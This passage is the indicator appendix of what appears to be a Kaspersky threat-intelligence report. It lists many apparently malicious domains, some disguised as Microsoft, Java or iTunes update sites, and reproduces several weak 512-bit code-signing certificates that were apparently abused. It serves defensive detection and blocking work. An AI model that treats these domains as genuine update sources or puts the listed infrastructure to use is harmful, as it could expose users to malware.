autoupdafree.my5gigs.com                dailyissue.net
autoupdate.eg.vg                        dailynews.000page.com
autoupdate.freehostia.com               dailypatch-rnr2008.net
autoupdate.megabyet.net                 dailysummary.net
autoupdate.zoka.cc                      dailyupdate.110mb.com
autoupdatefree.freehostia.com           domainmanagemenet.com
autoupdatefree.verwalten.ch             donatewa.phpnet.us
autoupdatefree.waldennetworks.com       downsw.onlinewebshop.net
TLP: Green
           For any inquiries, please contact intelreports@kaspersky.com
dpc.servegame.com                        humanforum.net
ds505cam.com                             hummfoundation.org
ebizcentres.com                          individuals.sytes.net
elibrarycentre.com                       infonetworks.biz
err.cloins.com                           innewsmessenger.com
eztwt.com                                jackie311.byethost16.com
fame.mooo.com                            jandas.byethost7.com
fashions.0fees.net                       javaupdate.flashserv.net
fenraw.northgeremy.info                  jonejokoss.byethost6.com
fenrix.yaahosting.info                   jonemaccane1.byethost7.com
fenrmi.eu.pn                             jpnspts.biz
foreignaffair.org                        jpqueen.biz
gamepia008.my5gigs.com                   kaoal.chickenkiller.com
genelousmanis.phpnet.us                  laborsforum.org
generalemountina.com                     lakers.jumpingcrab.com
genuinsman.phpnet.us                     limited.000space.com
gigahermes.com                           lookasjames.000space.com
gigamiros.zyns.com                       mansgepitostraig.com
gigathread.itemdb.com                    mechanicalcomfort.net
gigatrend.org                            microalba.serveftp.com
giveaway.6te.net                         microblo5.mooo.com
goathoney.biz                            microbrownys.strangled.net
goizmi.ignorelist.com                    microchiefs.twilightparadox.com
goizmi.phpnet.us                         microchisk.mooo.com
goldblacktree.waldennetworks.com         microchsse.strangled.net
gphpnet.phpnet.us                        microdelta.crabdance.com
greatechangemind.com                     microgenuinsman.servebeer.com
greenlabelstud.000space.com              microjonjokoss.jumpingcrab.com
gurunichi.createandhost.com              microlilics.000space.com
halemdus.000space.com                    microlilics.crabdance.com
heinzmarket.com                          micromacrarusn.com
hotemup.icr38.net                        micromacs.org
TLP: Green
            For any inquiries, please contact intelreports@kaspersky.com
                                                                                15
micromichi.ezua.com                       pb.qocp.net
micromps1.net                             pb.upinfo.biz
micronames.jumpingcrab.com                photo.eonlineworld.com
micronao.hopto.org                        popin.0fees.net
micronaoko.jumpingcrab.com                private.neao.biz
microos.jumpingcrab.com                   proteingainer.biz
microplants.strangled.net                 rainbowbbs.mywebcommunity.org
microsoft-xpupdate.com                    rayp.biz
microyours.ignorelist.com                 re.policyforums.org
minshatopas12.org                         redblacksleep.createandhost.com
msdn4updates.com                          redlooksman.servehttp.com
mshotfix.com                              reportinshop.com
msupdates.com                             reportinside.net
myhome.serveuser.com                      rootca.000space.com
myphone.freei.me                          sales.eu5.org
nanogalsman.org                           secureonline.net
nanomicsoft.com                           self-makeups.com
nanoocspos.com                            self-makingups.com
nanosleepss.net                           sellingconnection.org
ncnbroadcasting.reportinside.net          sens.humanforum.net
neao.biz                                  shndia.com
neosilba.com                              silverbell.000space.com
new.freecinemaworld.net                   sipapals.servehalflife.com
new.islamicawaken.com                     smartappactiv.com
newsagencypool.com                        smartnewup.crabdance.com
newsdailyinhk.com                         sourcecodecenter.org
newsups.000a.biz                          spotnews.com
nokasblog.agilityhoster.com               st.cloins.com
officerevision.com                        stloelementry.200gigs.com
online.usean.biz                          students.serveblog.net
outlookz.com                              support
forum.org
pb.enewslive.org                          terryblog.110MB.com
TLP: Green
             For any inquiries, please contact intelreports@kaspersky.com
thenewesthta.mypressonline.com          upgrade77.steadywebs.com
thirdbase.bugs3.com                     video.humorme.info
todaynewscentre.net                     voicemailz.net
tradeinf.com                            wein.isgreat.org
unknown12.ignorelist.com                windowservices.net
updaairpush.ignorelist.com              world.issuetoday.net
updaily.biz.nf                          world.uktimesnews.com
updaily.phpnet.us                       wowhome.byethost8.com
updaisin.net16.net                      ww42.200gigs.com
updalsim.freehostee.com                 www.appfreetools.com
updarling.000a.biz                      www.digitalimagestudy.com
updatable.20x.cc                        www.imggoogle.com
updateall.000a.biz                      www.info-cache.net
updatecache.net                         www.mobilitysvc.com
updatefast.000a.biz                     www.neosilba.com
updateiphone.20x.cc                     www.newsupdates.org
updateitunes.waldennetworks.com         www.serveblog.net
updatejava.megabyet.net                 www.singlehost.org
updatepatch.icr38.net                   www.smartnewup.com
updateschedule.verwalten.ch             www.sqlengine.net
updatesw.110mb.com                      www.strangled.net
updatesw.zoka.cc                        www.universalonline.com
updatewell.freebyte.us                  www.win7smartupdate.com
updatewifis.dyndns-wiki.com             yahooservice.biz
updauganda.waldennetworks.com           yellowleos.phpnet.us
updawn4you.net84.net                    ypiz.net
TLP: Green
           For any inquiries, please contact intelreports@kaspersky.com
                                                                            17
Appendix C. Code-signing certificates
 Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number: 2576597 (0x2750d5)
        Signature Algorithm: sha1WithRSAEncryption
        Issuer: C=MY, O=Digicert Sdn. Bhd., OU=457608K,
        CN=Digisign Server ID (Enrich)
        Validity
           Not Before: Jun 2 03:55:56 2009 GMT
           Not After : Jun 2 03:55:56 2011 GMT
        Subject: C=MY, O=JARING Communications Sdn.Bhd.,
        OU=JARING, CN=webmail.jaring.my,
        L=W.Persekutuan/emailAddress=sysadmin@jaring.my,
        ST=Kuala Lumpur
        Subject Public Key Info:
           Public Key Algorithm: rsaEncryption
              PublicKey: (512 bit)
              Modulus:
                 00:a4:81:6d:8d:e4:a6:fa:64:68:c8:41:4b:f3:08:
                 89:c6:8c:f5:52:c5:64:00:7a:a4:00:29:be:fb:e6:
                 c8:b7:92:de:52:71:f8:23:27:16:8e:4f:59:c4:c3:
                 52:2c:b2:7e:72:d9:b1:88:ae:a5:23:01:2d:5b:63:
                 dd:8d:49:1e:8f
              Exponent: 65537 (0x10001)
        X509v3 extensions:
           X509v3 Subject Key Identifier:
              41:6B:A5:9E:58:E5:29:B7
           X509v3 Certificate Policies:
              Policy: 2.16.458.1.1
              CPS: http://www.digicert.com.my/cps.htm
           X509v3 Authority Key Identifier:
              keyid:C6:16:93:4E:16:17:EC:16:AE:8C:94:76:F3:86:6D:C
              5:74:6E:84:77
           X509v3 Key Usage:
              Digital Signature, Non Repudiation, Key
              Encipherment, Data Encipherment
    Signature Algorithm: sha1WithRSAEncryption
        57:b9:37:76:d1:c4:95:5d:cf:20:51:ea:c5:92:ad:7e:24:a7:
TLP: Green
         For any inquiries, please contact intelreports@kaspersky.com
          78:d2:92:c1:76:45:c6:0f:6e:84:35:15:aa:82:8b:42:55:1d:
          e0:8a:8e:86:13:de:98:02:8e:25:2b:24:a8:8b:84:a2:36:37:
          f4:f6:1d:81:1b:96:c7:ee:2d:f9:68:fe:78:98:8b:bb:5a:a0:
          bb:40:03:b2:ca:6b:84:12:e8:c4:cd:df:ad:9d:66:c7:75:08:
          60:5b:e3:04:de:bf:25:99:fb:d1:5a:12:b1:d9:a8:c3:48:19:
          ed:bf:dc:b7:5f:ff:8e:cf:37:2b:24:65:e5:3f:b9:b2:63:cc:
          cf:5c
 BEGIN CERTIFICATE
 MIIC2TCCAkKgAwIBAgIDJ1DVMA0GCSqGSIb3DQEBBQUAMGMxCzAJBgNVBAYTAk1Z
 MRswGQYDVQQKExJEaWdpY2VydCBTZG4uIEJoZC4xETAPBgNVBAsTCDQ1NzYwOC1L
 MSQwIgYDVQQDExtEaWdpc2lnbiBTZXJ2ZXIgSUQgKEVucmljaCkwHhcNMDkwNjAy
 MDM1NTU2WhcNMTEwNjAyMDM1NTU2WjCBtjELMAkGA1UEBhMCTVkxJzAlBgNVBAoT
 HkpBUklORyBDb21tdW5pY2F0aW9ucyBTZG4uQmhkLjEPMA0GA1UECxMGSkFSSU5H
 MRowGAYDVQQDExF3ZWJtYWlsLmphcmluZy5teTEWMBQGA1UEBxMNVy5QZXJzZWt1
 dHVhbjEhMB8GCSqGSIb3DQEJARYSc3lzYWRtaW5AamFyaW5nLm15MRYwFAYDVQQI
 Ew1LdWFsYSBMdW1wdXIgMFwwDQYJKoZIhvcNAQEBBQADSwAwSAJBAKSBbY3kpvpk
 aMhBS/MIicaM9VLFZAB6pAApvvvmyLeS3lJx+CMnFo5PWcTDUiyyfnLZsYiupSMB
 LVtj3Y1JHo8CAwEAAaOBijCBhzARBgNVHQ4ECgQIQWulnljlKbcwRAYDVR0gBD0w
 OzA5BgVgg0oBATAwMC4GCCsGAQUFBwIBFiJodHRwOi8vd3d3LmRpZ2ljZXJ0LmNv
 bS5teS9jcHMuaHRtMB8GA1UdIwQYMBaAFMYWk04WF+wWroyUdvOGbcV0boR3MAsG
 A1UdDwQEAwIE8DANBgkqhkiG9w0BAQUFAAOBgQBXuTd20cSVXc8gUerFkq1+JKd4
 0pLBdkXGD26ENRWqgotCVR3gio6GE96YAo4lKySoi4SiNjf09h2BG5bH7i35aP54
 mIu7WqC7QAOyymuEEujEzd+tnWbHdQhgW+ME3r8lmfvRWhKx2ajDSBntv9y3X/+O
 zzcrJGXlP7myY8zPXA==
 END CERTIFICATE
 Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number: 2657623 (0x288d57)
        Signature Algorithm: sha1WithRSAEncryption
        Issuer: C=MY, O=Digicert Sdn. Bhd., OU=457608K,
 CN=Digisign Server ID (Enrich)
        Validity
           Not Before: Sep 29 06:46:10 2009 GMT
           Not After : Sep 29 06:46:10 2011 GMT
        Subject: O=MARDI, CN=anjungnet.mardi.gov.my, ST=SERDANG
        Subject Public Key Info:
TLP: Green
           For any inquiries, please contact intelreports@kaspersky.com
                                                                             19
           Public Key Algorithm: rsaEncryption
              PublicKey: (512 bit)
              Modulus:
                  00:ba:4f:4f:7d:e9:62:7a:d5:f8:62:99:0d:29:4c:
                  af:0e:f4:7d:49:7e:6e:d9:30:d3:06:49:6b:b0:77:
                  cd:67:2d:c9:61:55:3d:00:b1:7a:b4:a0:f4:64:61:
                  9c:81:38:3e:44:6e:0e:15:a9:58:f9:60:68:a2:29:
                  b2:0d:7e:67:71
              Exponent: 65537 (0x10001)
        X509v3 extensions:
           X509v3 Subject Key Identifier:
              48:15:99:11:61:48:10:FD
           X509v3 Certificate Policies:
              Policy: 2.16.458.1.1
              CPS: http://www.digicert.com.my/cps.htm
           X509v3 Authority Key Identifier:
              keyid:C6:16:93:4E:16:17:EC:16:AE:8C:94:76:F3:86:6D:C
              5:74:6E:84:77
           X509v3 Key Usage:
              Digital Signature, Non Repudiation, Key
              Encipherment, Data Encipherment
     Signature Algorithm: sha1WithRSAEncryption
        8a:89:09:23:6f:ff:bd:7d:0b:45:ff:a8:83:ae:cf:c3:f3:1a:
        79:9d:f4:42:22:37:78:b4:6b:7b:86:4f:ee:7a:35:4b:52:8e:
        25:25:b3:06:37:1f:f0:bd:72:56:af:d9:b0:cd:48:be:8a:3c:
        a2:07:10:1f:7b:62:c9:01:02:47:a9:b8:7f:27:52:13:28:b4:
        c6:a8:5b:e5:57:1a:d3:92:3d:5b:5c:b3:a9:14:cf:1b:ea:fd:
        43:48:36:11:9d:85:25:4d:f9:26:84:d8:4d:1a:9c:bd:47:67:
        5f:e6:1d:e7:17:71:71:24:15:68:4e:68:9f:bf:62:10:3e:75:
        83:a2
 BEGIN CERTIFICATE
 MIICZTCCAc6gAwIBAgIDKI1XMA0GCSqGSIb3DQEBBQUAMGMxCzAJBgNVBAYTAk1Z
 MRswGQYDVQQKExJEaWdpY2VydCBTZG4uIEJoZC4xETAPBgNVBAsTCDQ1NzYwOC1L
 MSQwIgYDVQQDExtEaWdpc2lnbiBTZXJ2ZXIgSUQgKEVucmljaCkwHhcNMDkwOTI5
 MDY0NjEwWhcNMTEwOTI5MDY0NjEwWjBDMQ4wDAYDVQQKEwVNQVJESTEfMB0GA1UE
 AxMWYW5qdW5nbmV0Lm1hcmRpLmdvdi5teTEQMA4GA1UECBMHU0VSREFORzBcMA0G
 CSqGSIb3DQEBAQUAA0sAMEgCQQC6T0996WJ61fhimQ0pTK8O9H1Jfm7ZMNMGSWuw
 d81nLclhVT0AsXq0oPRkYZyBOD5Ebg4VqVj5YGiiKbINfmdxAgMBAAGjgYowgYcw
 EQYDVR0OBAoECEgVmRFhSBD9MEQGA1UdIAQ9MDswOQYFYINKAQEwMDAuBggrBgEF
TLP: Green
          For any inquiries, please contact intelreports@kaspersky.com
 BQcCARYiaHR0cDovL3d3dy5kaWdpY2VydC5jb20ubXkvY3BzLmh0bTAfBgNVHSME
 GDAWgBTGFpNOFhfsFq6MlHbzhm3FdG6EdzALBgNVHQ8EBAMCBPAwDQYJKoZIhvcN
 AQEFBQADgYEAiokJI2//vX0LRf+og67Pw/MaeZ30QiI3eLRre4ZP7no1S1KOJSWz
 Bjcf8L1yVq/ZsM1Ivoo8ogcQH3tiyQECR6m4fydSEyi0xqhb5Vca05I9W1yzqRTP
 G+r9Q0g2EZ2FJU35JoTYTRqcvUdnX+Yd5xdxcSQVaE5on79iED51g6I=
 END CERTIFICATE
 Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number:
           01:00:00:00:00:01:1e:de:de:a3:da
        Signature Algorithm: sha1WithRSAEncryption
        Issuer: C=BE, O=Cybertrust, OU=Educational CA,
        CN=Cybertrust Educational CA
        Validity
           Not Before: Jan 16 08:55:33 2009 GMT
           Not After : Jan 16 08:55:33 2012 GMT
        Subject: C=GB, ST=England, L=London, O=London Metropolitan
        University, OU=ISS, CN=skillsforge.londonmet.ac.uk
        Subject Public Key Info:
           Public Key Algorithm: rsaEncryption
              PublicKey: (512 bit)
              Modulus:
                 00:b8:73:f6:45:f2:83:21:4e:66:5d:a8:7d:29:a4:
                 aa:21:1e:cb:1e:03:41:dc:1f:cd:1b:2c:d0:f6:3f:
                 ca:ed:46:f2:be:8f:32:92:1c:a1:69:06:08:db:b9:
                 ee:e2:51:bb:9c:bf:68:c3:6f:61:8a:de:e5:be:46:
                 5b:c4:bf:44:b9
              Exponent: 65537 (0x10001)
        X509v3 extensions:
           X509v3 Key Usage: critical
              Digital Signature, Key Encipherment
           X509v3 Authority Key Identifier:
              keyid:65:65:A3:3D:D7:3B:11:A3:0A:07:25:37:C9:42:4A:5
              B:76:77:50:E1
           X509v3 Subject Key Identifier:
              14:5A:F5:85:8E:AC:81:77:46:5F:22:70:39:2E:64:E5:EF:
              F5:28:E1
           X509v3 CRL Distribution Points:
TLP: Green
         For any inquiries, please contact intelreports@kaspersky.com
                                                                             21
              Full Name:
                  URI:http://crl.globalsign.net/educational.crl
              Authority Information Access:
              CA Issuers URI:
                  http://secure.globalsign.net/cacert/educational.crt
              Netscape Cert Type:
                  SSL Client, SSL Server
     Signature Algorithm: sha1WithRSAEncryption
        2a:fd:1e:cb:cd:45:42:24:44:32:72:bd:3c:cb:27:31:4a:8b:
        2a:25:48:65:06:31:fd:81:5d:ac:e1:5b:6a:ff:96:2a:50:73:
        1e:16:9b:2a:4f:18:ee:fe:26:30:d0:cb:96:f6:11:e6:2b:0f:
        95:d1:4b:80:cd:a8:aa:0c:1b:6c:a4:7a:41:af:db:9f:00:b1:
        64:51:d3:db:16:ad:27:98:23:a8:43:dc:3a:2c:17:79:7b:90:
        71:fa:ad:00:9c:ec:d1:24:b7:ba:81:de:35:e9:d6:fe:a0:92:
        46:69:b2:86:36:04:57:ba:9b:b0:92:24:e9:44:2b:ca:d8:09:
        54:b0:2d:64:21:24:c0:d4:77:86:de:77:04:2b:f2:6b:a8:1d:
        de:9b:5b:df:32:d3:45:ee:32:e6:60:a6:07:77:02:ef:98:d1:
        9d:de:40:3b:42:74:dd:c6:da:bb:2f:1a:42:58:93:db:2e:1f:
        f9:23:41:ab:e7:63:c7:1c:d3:ec:f3:bf:60:41:64:0c:ef:22:
        b3:a0:cb:ae:bd:32:0e:0f:3c:00:13:b0:32:47:62:b5:aa:22:
        7b:76:0b:d2:f2:f5:eb:92:c8:f8:6c:9d:d3:ad:f7:f1:b9:c6:
        94:51:31:5a:e8:1b:68:76:d4:3a:00:83:b3:3f:ef:03:a2:d2:
        c5:25:d8:d4
 BEGIN CERTIFICATE
 MIIDnjCCAoagAwIBAgILAQAAAAABHt7eo9owDQYJKoZIhvcNAQEFBQAwXzELMAkG
 A1UEBhMCQkUxEzARBgNVBAoTCkN5YmVydHJ1c3QxFzAVBgNVBAsTDkVkdWNhdGlv
 bmFsIENBMSIwIAYDVQQDExlDeWJlcnRydXN0IEVkdWNhdGlvbmFsIENBMB4XDTA5
 MDExNjA4NTUzM1oXDTEyMDExNjA4NTUzM1owgY0xCzAJBgNVBAYTAkdCMRAwDgYD
 VQQIEwdFbmdsYW5kMQ8wDQYDVQQHEwZMb25kb24xJzAlBgNVBAoTHkxvbmRvbiBN
 ZXRyb3BvbGl0YW4gVW5pdmVyc2l0eTEMMAoGA1UECxMDSVNTMSQwIgYDVQQDExtz
 a2lsbHNmb3JnZS5sb25kb25tZXQuYWMudWswXDANBgkqhkiG9w0BAQEFAANLADBI
 AkEAuHP2RfKDIU5mXah9KaSqIR7LHgNB3B/NGyzQ9j/K7Ubyvo8ykhyhaQYI27nu
 4lG7nL9ow29hit7lvkZbxL9EuQIDAQABo4HzMIHwMA4GA1UdDwEB/wQEAwIFoDAf
 BgNVHSMEGDAWgBRlZaM91zsRowoHJTfJQkpbdndQ4TAdBgNVHQ4EFgQUFFr1hY6s
 gXdGXyJwOS5k5e/1KOEwOgYDVR0fBDMwMTAvoC2gK4YpaHR0cDovL2NybC5nbG9i
 YWxzaWduLm5ldC9lZHVjYXRpb25hbC5jcmwwTwYIKwYBBQUHAQEEQzBBMD8GCCsG
 AQUFBzAChjNodHRwOi8vc2VjdXJlLmdsb2JhbHNpZ24ubmV0L2NhY2VydC9lZHVj
 YXRpb25hbC5jcnQwEQYJYIZIAYb4QgEBBAQDAgbAMA0GCSqGSIb3DQEBBQUAA4IB
 AQAq/R7LzUVCJEQycr08yycxSosqJUhlBjH9gV2s4Vtq/5YqUHMeFpsqTxju/iYw
TLP: Green
          For any inquiries, please contact intelreports@kaspersky.com
 0MuW9hHmKw+V0UuAzaiqDBtspHpBr9ufALFkUdPbFq0nmCOoQ9w6LBd5e5Bx+q0A
 nOzRJLe6gd416db+oJJGabKGNgRXupuwkiTpRCvK2AlUsC1kISTA1HeG3ncEK/Jr
 qB3em1vfMtNF7jLmYKYHdwLvmNGd3kA7QnTdxtq7LxpCWJPbLh/5I0Gr52PHHNPs
 879gQWQM7yKzoMuuvTIODzwAE7AyR2K1qiJ7dgvS8vXrksj4bJ3TrffxucaUUTFa
 6BtodtQ6AIOzP+8DotLFJdjU
 END CERTIFICATE
 Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number: 19771 (0x4d3b)
        Signature Algorithm: sha1WithRSAEncryption
        Issuer: C=US, O=Anthem Inc, OU=Ecommerce, CN=Anthem Inc
        Certificate Authority
        Validity
           Not Before: Apr 22 18:15:10 2009 GMT
           Not After : Apr 22 18:15:10 2010 GMT
        Subject: C=US, ST=Indiana, L=Indianapolis, O=Anthem
        Insurance Company Inc, OU=EBusiness, CN=ahi.anthem.com
        Subject Public Key Info:
           Public Key Algorithm: rsaEncryption
               PublicKey: (512 bit)
               Modulus:
                  00:d4:95:e5:13:d8:7f:91:27:29:f6:76:72:9a:13:
                  a6:e2:4b:ec:16:ed:fc:a5:d8:f9:a1:f3:57:4b:85:
                  56:ec:ca:80:9f:0c:23:9d:36:45:db:ee:a8:ee:47:
                  b7:33:21:e4:93:72:7d:00:02:98:08:d8:88:c9:45:
                  b5:22:cc:bc:77
               Exponent: 65537 (0x10001)
        X509v3 extensions:
           X509v3 Basic Constraints: critical
               CA:FALSE
           X509v3 Subject Alternative Name:
               email:dlaitmiddleware@anthem.com
           X509v3 Key Usage: critical
               Key Encipherment
           X509v3 Authority Key Identifier:
               keyid:FA:1A:DC:3E:5D:A6:B5:FD:FA:5F:6C:CB:28:40:D3:E
               0:97:A2:AA:AC
TLP: Green
         For any inquiries, please contact intelreports@kaspersky.com
                                                                             23
              DirName:/C=US/O=GTE Corporation/OU=GTE CyberTrust
              Solutions, Inc./CN=GTE
              CyberTrust Global Root
              serial:07:27:16:11
           X509v3 Subject Key Identifier:
              6B:46:CC:B6:F4:8F:05:14:46:5D:D8:23:B8:05:73:E3:58:
              7E:D6:A6
     Signature Algorithm: sha1WithRSAEncryption
        71:72:2a:c2:fc:70:13:d6:7a:a7:08:50:f2:e5:c9:7d:61:e8:
        3d:bd:98:89:2a:76:3f:16:1e:c1:2d:31:8b:81:b6:95:83:5b:
        d3:48:35:3d:78:9a:e3:76:c9:89:a0:8a:74:a0:cd:ae:56:cf:
        30:c7:72:d2:72:d0:aa:4b:9c:18:13:41:90:30:45:6d:bd:24:
        d4:88:1e:83:f3:ef:ac:d7:c3:6f:82:2d:10:20:d6:06:01:36:
        45:50:13:b4:32:6b:39:73:c9:7d:67:84:d4:ab:87:fc:c9:2a:
        8d:ee:63:7a:e2:f1:8c:4a:47:7f:3a:cb:6e:68:a2:c1:32:c6:
        04:e6:7a:35:45:46:05:99:29:90:2e:a8:2e:dd:8a:d4:8c:31:
        2e:77:57:84:62:87:fa:e1:60:2a:2a:e7:15:4c:4b:18:0d:a7:
        a2:cb:d6:32:ae:40:73:51:65:76:df:08:d4:f5:fa:a9:d9:c3:
        d4:5f:12:dc:ca:cd:4d:1e:ca:de:9f:c3:c9:5d:53:4c:d2:54:
        14:43:e5:d8:2b:9c:7c:7e:da:33:d7:69:80:43:dd:96:3d:64:
        aa:91:63:5f:48:50:7b:33:d7:85:3a:a9:d7:74:71:da:4a:82:
        cf:b1:14:82:f6:95:72:d8:a9:24:3e:b4:14:94:0c:17:2c:6f:
        8a:93:1a:a2
 BEGIN CERTIFICATE
 MIIDsTCCApmgAwIBAgICTTswDQYJKoZIhvcNAQEFBQAwYTELMAkGA1UEBhMCVVMx
 EzARBgNVBAoTCkFudGhlbSBJbmMxEjAQBgNVBAsTCUVjb21tZXJjZTEpMCcGA1UE
 AxMgQW50aGVtIEluYyBDZXJ0aWZpY2F0ZSBBdXRob3JpdHkwHhcNMDkwNDIyMTgx
 NTEwWhcNMTAwNDIyMTgxNTEwWjCBijELMAkGA1UEBhMCVVMxEDAOBgNVBAgTB0lu
 ZGlhbmExFTATBgNVBAcTDEluZGlhbmFwb2xpczElMCMGA1UEChMcQW50aGVtIElu
 c3VyYW5jZSBDb21wYW55IEluYzESMBAGA1UECxMJRUJ1c2luZXNzMRcwFQYDVQQD
 Ew5haGkuYW50aGVtLmNvbTBcMA0GCSqGSIb3DQEBAQUAA0sAMEgCQQDUleUT2H+R
 Jyn2dnKaE6biS+wW7fyl2Pmh81dLhVbsyoCfDCOdNkXb7qjuR7czIeSTcn0AApgI
 2IjJRbUizLx3AgMBAAGjggEPMIIBCzAMBgNVHRMBAf8EAjAAMCcGA1UdEQQgMB6B
 HGRsLWFpdC1taWRkbGV3YXJlQGFudGhlbS5jb20wDgYDVR0PAQH/BAQDAgUgMIGi
 BgNVHSMEgZowgZeAFPoa3D5dprX9+l9syyhA0+CXoqqsoXmkdzB1MQswCQYDVQQG
 EwJVUzEYMBYGA1UEChMPR1RFIENvcnBvcmF0aW9uMScwJQYDVQQLEx5HVEUgQ3li
 ZXJUcnVzdCBTb2x1dGlvbnMsIEluYy4xIzAhBgNVBAMTGkdURSBDeWJlclRydXN0
 IEdsb2JhbCBSb290ggQHJxYRMB0GA1UdDgQWBBRrRsy29I8FFEZd2CO4BXPjWH7W
 pjANBgkqhkiG9w0BAQUFAAOCAQEAcXIqwvxwE9Z6pwhQ8uXJfWHoPb2YiSp2PxYe
TLP: Green
          For any inquiries, please contact intelreports@kaspersky.com
 wS0xi4G2lYNb00g1PXia43bJiaCKdKDNrlbPMMdy0nLQqkucGBNBkDBFbb0k1Ige
 g/PvrNfDb4ItECDWBgE2RVATtDJrOXPJfWeE1KuH/Mkqje5jeuLxjEpHfzrLbmii
 wTLGBOZ6NUVGBZkpkC6oLt2K1IwxLndXhGKH+uFgKirnFUxLGA2nosvWMq5Ac1Fl
 dt8I1PX6qdnD1F8S3MrNTR7K3p/DyV1TTNJUFEPl2CucfH7aM9dpgEPdlj1kqpFj
 X0hQezPXhTqp13Rx2kqCz7EUgvaVctipJD60FJQMFyxvipMaog==
 END CERTIFICATE
 Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number: 1707608080 (0x65c80810)
        Signature Algorithm: sha1WithRSAEncryption
        Issuer: C=TW, O=TAIWANCA.
        COM Inc., OU=SSL Certification Service Provider,
        CN=TaiCA Secure CA
        Validity
           Not Before: Jul 2 06:34:05 2010 GMT
           Not After : Jul 17 15:59:59 2011 GMT
        Subject: C=TW, ST=Taipei, L=Taipei, O=TRADEVAN,
        OU=TRADEVAN, CN=www.esupplychain.com.tw
        Subject Public Key Info:
           Public Key Algorithm: rsaEncryption
              PublicKey: (512 bit)
              Modulus:
                 00:d2:80:52:89:4d:eb:b7:dd:56:41:56:09:71:ce:
                 87:a0:ad:1d:27:c1:a5:e3:94:27:1b:22:f0:d5:6c:
                 3c:d5:23:df:0a:22:b9:a0:19:53:5d:85:7e:ca:2a:
                 51:4d:7d:24:c3:d0:64:0a:52:eb:84:59:f2:2e:68:
                 c3:d8:bf:13:d1
              Exponent: 65537 (0x10001)
        X509v3 extensions:
           X509v3 Authority Key Identifier:
              keyid:D4:85:27:D2:27:A4:BE:AB:5E:2F:41:1B:EA:52:24:3
              9:99:4E:46:2E
           X509v3 Subject Key Identifier:
              4B:EC:AE:F9:6A:02:DF:92:0A:0D:6B:FC:B9:5A:C0:77:BB:
              1E:56:D4
           X509v3 CRL Distribution Points:
              Full Name:
TLP: Green
         For any inquiries, please contact intelreports@kaspersky.com
                                                                             25
                  URI:http://sslserver.twca.com.tw/sslserver/
                  revoke10.crl
           X509v3 Certificate Policies:
              Policy: 2.16.158.3.1.8.5
              User Notice:
              Explicit Text: Restriction =3.2.1.1
              CPS: www.twca.com.tw
           X509v3 Basic Constraints:
              CA:FALSE
     Signature Algorithm: sha1WithRSAEncryption
        8e:94:2c:a7:d4:ee:6f:d4:4b:3e:b1:ee:88:75:96:c2:52:b8:
        37:ed:c3:13:51:4f:af:8c:e8:1a:0a:cc:c8:9d:81:16:06:2f:
        e5:48:a7:93:1e:10:07:4a:53:a2:f6:41:a4:93:29:93:c3:58:
        88:7c:22:a4:f5:7f:53:b0:de:2f:d2:36:8b:1d:ed:54:c6:53:
        d0:d5:2e:26:cc:29:9b:94:4b:14:2e:19:78:89:29:54:02:6b:
        ff:93:9d:b2:83:c2:19:b0:a1:10:c9:f4:bd:bd:f0:35:2e:44:
        4f:7c:00:35:33:ad:52:ac:49:0c:67:0e:48:ca:50:ff:8b:18:
        1a:b5
 BEGIN CERTIFICATE
 MIIDDTCCAnagAwIBAgIEZcgIEDANBgkqhkiG9w0BAQUFADBxMQswCQYDVQQGEwJU
 VzEbMBkGA1UEChMSVEFJV0FOLUNBLkNPTSBJbmMuMSswKQYDVQQLEyJTU0wgQ2Vy
 dGlmaWNhdGlvbiBTZXJ2aWNlIFByb3ZpZGVyMRgwFgYDVQQDEw9UYWlDQSBTZWN1
 cmUgQ0EwHhcNMTAwNzAyMDYzNDA1WhcNMTEwNzE3MTU1OTU5WjB5MQswCQYDVQQG
 EwJUVzEPMA0GA1UECBMGVGFpcGVpMQ8wDQYDVQQHEwZUYWlwZWkxEjAQBgNVBAoT
 CVRSQURFLVZBTjESMBAGA1UECxMJVFJBREUtVkFOMSAwHgYDVQQDExd3d3cuZXN1
 cHBseWNoYWluLmNvbS50dzBcMA0GCSqGSIb3DQEBAQUAA0sAMEgCQQDSgFKJTeu3
 3VZBVglxzoegrR0nwaXjlCcbIvDVbDzVI98KIrmgGVNdhX7KKlFNfSTD0GQKUuuE
 WfIuaMPYvxPRAgMBAAGjge0wgeowHwYDVR0jBBgwFoAU1IUn0iekvqteL0Eb6lIk
 OZlORi4wHQYDVR0OBBYEFEvsrvlqAt+SCg1r/LlawHe7HlbUMEQGA1UdHwQ9MDsw
 OaA3oDWGM2h0dHA6Ly9zc2xzZXJ2ZXIudHdjYS5jb20udHcvc3Nsc2VydmVyL3Jl
 dm9rZTEwLmNybDBXBgNVHSAEUDBOMEwGB2CBHgMBCAUwQTAiBggrBgEFBQcCAjAW
 GhRSZXN0cmljdGlvbiA9My4yLjEuMTAbBggrBgEFBQcCARYPd3d3LnR3Y2EuY29t
 LnR3MAkGA1UdEwQCMAAwDQYJKoZIhvcNAQEFBQADgYEAjpQsp9Tub9RLPrHuiHWW
 wlK4N+3DE1FPr4zoGgrMyJ2BFgYv5Uinkx4QB0pTovZBpJMpk8NYiHwipPV/U7De
 L9I2ix3tVMZT0NUuJswpm5RLFC4ZeIkpVAJr/5OdsoPCGbChEMn0vb3wNS5ET3wA
 NTOtUqxJDGcOSMpQ/4sYGrU=
 END CERTIFICATE
TLP: Green
          For any inquiries, please contact intelreports@kaspersky.com
 Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number: 19771 (0x4d3b)
        Signature Algorithm: sha1WithRSAEncryption
        Issuer: C=US, O=Anthem Inc, OU=Ecommerce, CN=Anthem Inc
        Certificate Authority
        Validity
           Not Before: Apr 22 18:15:10 2009 GMT
           Not After : Apr 22 18:15:10 2010 GMT
        Subject: C=US, ST=Indiana, L=Indianapolis, O=Anthem
        Insurance Company Inc, OU=EBusiness, CN=ahi.anthem.com
        Subject Public Key Info:
           Public Key Algorithm: rsaEncryption
               PublicKey: (512 bit)
               Modulus:
                  00:d4:95:e5:13:d8:7f:91:27:29:f6:76:72:9a:13:
                  a6:e2:4b:ec:16:ed:fc:a5:d8:f9:a1:f3:57:4b:85:
                  56:ec:ca:80:9f:0c:23:9d:36:45:db:ee:a8:ee:47:
                  b7:33:21:e4:93:72:7d:00:02:98:08:d8:88:c9:45:
                  b5:22:cc:bc:77
               Exponent: 65537 (0x10001)
        X509v3 extensions:
